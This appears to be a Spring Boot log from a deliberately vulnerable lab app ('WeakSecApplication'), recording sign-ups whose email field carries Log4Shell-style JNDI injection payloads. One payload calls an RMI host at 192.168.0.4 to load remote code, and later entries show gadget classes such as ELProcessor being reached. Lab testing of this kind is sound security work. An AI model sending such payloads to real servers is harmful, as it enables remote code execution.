+2022-02-16 18:10:39.130  INFO 40948 --- [restartedMain] j.LocalContainerEntityManagerFactoryBean : Initialized JPA EntityManagerFactory for persistence unit 'default'
+2022-02-16 18:10:39.308  WARN 40948 --- [restartedMain] JpaBaseConfiguration$JpaWebConfiguration : spring.jpa.open-in-view is enabled by default. Therefore, database queries may be performed during view rendering. Explicitly configure spring.jpa.open-in-view to disable this warning
+2022-02-16 18:10:39.436  INFO 40948 --- [restartedMain] o.s.b.a.w.s.WelcomePageHandlerMapping    : Adding welcome page template: index
+2022-02-16 18:10:39.541  INFO 40948 --- [restartedMain] o.s.b.d.a.OptionalLiveReloadServer       : LiveReload server is running on port 35729
+2022-02-16 18:10:39.583  INFO 40948 --- [restartedMain] o.s.b.w.e.t.TomcatWebServer              : Tomcat started on port(s): 3000 (http) with context path ''
+2022-02-16 18:10:39.591  INFO 40948 --- [restartedMain] m.h.w.WeakSecApplication                 : Started WeakSecApplication in 2.609 seconds (JVM running for 3.39)
+2022-02-16 18:11:04.030  INFO 40948 --- [http-nio-3000-exec-1] o.s.w.s.DispatcherServlet                : Initializing Servlet 'dispatcherServlet'
+2022-02-16 18:11:04.031  INFO 40948 --- [http-nio-3000-exec-1] o.s.w.s.DispatcherServlet                : Completed initialization in 0 ms
+2022-02-16 18:12:11.206  INFO 40948 --- [http-nio-3000-exec-4] m.h.w.c.UserController                   : New User Created: 
+2022-02-16 18:12:11.207  INFO 40948 --- [http-nio-3000-exec-4] m.h.w.c.UserController                   : Username: jackie
+2022-02-16 18:12:11.207  INFO 40948 --- [http-nio-3000-exec-4] m.h.w.c.UserController                   : Email: jackie@boy.com"; Reference Class Name: foo
+
+2022-02-16 18:35:04.782  INFO 40948 --- [http-nio-3000-exec-1] m.h.w.c.UserController                   : New User Created: 
+2022-02-16 18:35:04.782  INFO 40948 --- [http-nio-3000-exec-1] m.h.w.c.UserController                   : Username: jackie
+2022-02-16 18:35:04.783  INFO 40948 --- [http-nio-3000-exec-1] m.h.w.c.UserController                   : Email: Reference Class Name: foo
+
+2022-02-16 18:47:20.866  INFO 40948 --- [http-nio-3000-exec-8] m.h.w.c.UserController                   : New User Created: 
+2022-02-16 18:47:20.867  INFO 40948 --- [http-nio-3000-exec-8] m.h.w.c.UserController                   : Username: jack
+2022-02-16 18:47:20.867  INFO 40948 --- [http-nio-3000-exec-8] m.h.w.c.UserController                   : Email: Reference Class Name: foo
+
+2022-02-16 18:49:04.805  INFO 40948 --- [http-nio-3000-exec-4] m.h.w.c.UserController                   : New User Created: 
+2022-02-16 18:49:04.806  INFO 40948 --- [http-nio-3000-exec-4] m.h.w.c.UserController                   : Username: jackie
+2022-02-16 18:49:04.806  INFO 40948 --- [http-nio-3000-exec-4] m.h.w.c.UserController                   : Email: javax.el.ELProcessor@5bdad518
+2022-02-16 18:58:04.317  INFO 40948 --- [http-nio-3000-exec-5] m.h.w.c.UserController                   : New User Created: 
+2022-02-16 18:58:04.318  INFO 40948 --- [http-nio-3000-exec-5] m.h.w.c.UserController                   : Username: jackie
+2022-02-16 18:58:04.318  INFO 40948 --- [http-nio-3000-exec-5] m.h.w.c.UserController                   : Email: ${jndi:rmi://192.168.0.4:1199/cd7vau}
+2022-02-16 19:00:34.747  INFO 40948 --- [http-nio-3000-exec-8] m.h.w.c.UserController                   : New User Created: 
+2022-02-16 19:00:34.747  INFO 40948 --- [http-nio-3000-exec-8] m.h.w.c.UserController                   : Username: jackie
+2022-02-16 19:00:34.747  INFO 40948 --- [http-nio-3000-exec-8] m.h.w.c.UserController                   : Email: Reference Class Name: foo
+
